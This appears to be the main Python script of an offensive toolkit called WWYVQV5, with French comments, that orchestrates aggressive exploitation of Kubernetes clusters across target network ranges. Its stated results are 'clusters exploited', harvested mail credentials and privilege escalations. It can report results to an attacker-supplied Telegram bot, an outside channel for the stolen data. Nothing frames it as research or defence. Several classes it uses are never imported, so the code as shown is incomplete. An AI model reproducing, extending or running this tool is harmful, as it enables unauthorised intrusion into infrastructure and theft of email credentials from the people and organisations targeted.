#!/usr/bin/env python3
"""
WWYVQV5 - Script principal avec Mail Services Integration
Version 5.1 Enhanced
"""

import asyncio
import argparse
from mail_services_hunter import MailServicesHunter
from telegram_mail_enhanced import TelegramMailNotifier
from kubernetes_privilege_escalation import KubernetesMailPrivilegeEscalation
from wwyvq5_mail_orchestrator import WWYVQv5MailOrchestrator

async def main():
    """Point d'entrée principal Enhanced"""
    parser = argparse.ArgumentParser(description="🚀 WWYVQV5 Enhanced - Mail Services Integration")
    
    parser.add_argument('--targets', '-f', help='Fichier de cibles')
    parser.add_argument('--telegram-token', help='Token Telegram Bot')
    parser.add_argument('--telegram-chat', help='Chat ID Telegram')
    parser.add_argument('--mail-focus', action='store_true', help='Focus sur services mail')
    parser.add_argument('--validate-creds', action='store_true', help='Validation des credentials')
    
    args = parser.parse_args()
    
    # Configuration Enhanced
    config = ExploitationConfig(
        mode=ExploitationMode.AGGRESSIVE,
        max_concurrent_clusters=50,
        timeout_per_operation=15
    )
    
    # Framework de base
    base_framework = KubernetesAdvancedExploitation(config)
    
    # Orchestrateur Enhanced
    orchestrator = WWYVQv5MailOrchestrator(base_framework)
    
    # Configuration Telegram si fournie
    if args.telegram_token and args.telegram_chat:
        orchestrator.telegram_notifier = TelegramMailNotifier(
            args.telegram_token, 
            args.telegram_chat
        )
    
    # Chargement des cibles
    targets = []
    if args.targets:
        with open(args.targets, 'r') as f:
            targets = [line.strip() for line in f if line.strip() and not line.startswith('#')]
    else:
        # Cibles par défaut pour demo
        targets = ["10.0.0.0/24", "172.16.0.0/24", "192.168.1.0/24"]
    
    print(f"🚀 WWYVQV5 Enhanced v5.1 - {len(targets)} cibles")
    print(f"📧 Mode mail focus: {'✅' if args.mail_focus else '❌'}")
    print(f"📱 Telegram activé: {'✅' if orchestrator.telegram_notifier.enabled else '❌'}")
    
    # Exploitation Enhanced
    results = await orchestrator.run_enhanced_exploitation(targets)
    
    print("\n📊 RÉSULTATS FINAUX:")
    print(f"├── Clusters exploités: {len(results['clusters_exploited'])}")
    print(f"├── Mail credentials: {len(results['mail_credentials_harvested'])}")
    print(f"├── Escalades: {len(results['privilege_escalations'])}")
    print(f"└── Session: {orchestrator.base_framework.session_id}")

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n⏹️ Arrêt demandé par l'utilisateur")
    except Exception as e:
        print(f"❌ Erreur fatale: {str(e)}")